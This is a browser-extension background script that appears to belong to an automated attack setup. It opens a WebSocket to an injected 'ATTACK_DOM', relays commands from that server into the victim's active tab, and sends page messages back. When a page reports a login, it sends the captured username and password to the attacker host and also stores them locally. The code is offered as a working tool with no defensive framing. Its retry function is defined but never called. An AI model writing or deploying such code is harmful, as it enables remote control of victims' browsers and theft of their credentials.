// var ATTACK_DOM = ""; injected by docker.py
// var BID = ""; injected

var finished = false;

function handleStartup() {
	console.log("browser started:"  + new Date().getTime());
}
browser.runtime.onStartup.addListener(handleStartup);

function connect() {
	console.log("connecting to websocket");
	var alive = true;
	var ws = new WebSocket("wss://" + ATTACK_DOM + ":80/")
	var pingInterval;
	ws.onopen = function(event) {
		pingInterval = setInterval(function() {
			if (!alive) {
				clearInterval(pingInterval);
				if (!finished)
					ws.close(4002);
				else
					ws.close(1001);
				return;
			}
			ws.send(JSON.stringify({"ping":BID, "time":"" + new Date().getTime()}));
			alive = false;
		}, 3000);
	}
	ws.onmessage = function(event) {
		msg = JSON.parse(event.data);
		if (msg.pong != undefined) {
			alive = true;	
			return;
		}
		browser.tabs.query({
			currentWindow: true,
			active: true
		  }).then(function(tabs){sendMessageToTabs(tabs, msg)});
	}
	ws.onclose = function(event) {
		clearInterval(pingInterval);
		console.log("lost connection... trying to reconnect");
		console.log(event);
		setTimeout(function() {
			console.log("reconnecting now");
			connect();
		}, 500);
	}
	window.ws = ws;
}

function sendMessageToTabs(tabs, msg) {
	for (let tab of tabs) {
		browser.tabs.sendMessage(
		  tab.id,
		  msg
		)
	}
}

browser.runtime.onMessage.addListener(function(msg, sender) {
	console.log("Sending message:");
	console.log(msg);
	if (msg.local == "removeTab") {
		browser.tabs.remove(sender.tab.id);	
		console.log('remvoning tab')
	}
	else {
		msg.id = "backend";
		msg.bid = BID;
		if (window.ws.readyState != 1) {
			console.log("Websocket not ready! oh no. Restarting it...");
			connect();
			function trySend() {
				setTimeout(()=>{
					if (window.ws.readyState == 1) {
						window.ws.send(JSON.stringify(msg));
					}
					else {
						console.log("still not ready. try again");
						trySend();
					}
				}, 500);
			}
		}
		else {
			window.ws.send(JSON.stringify(msg));
			console.log("Sent message");
		}
		if (msg.status == "loggedIn") {
			console.log("Setting local storage")
			finished = true
			browser.storage.local.set({"user" : msg.user});
			browser.storage.local.set({"pass" : msg.pass});
			window.ws.close(5050)
			window.ws = undefined;
		}

	}
});
browser.storage.local.get("user", function(result) {
	if (result.user == undefined || result.user == "")
		connect();
});
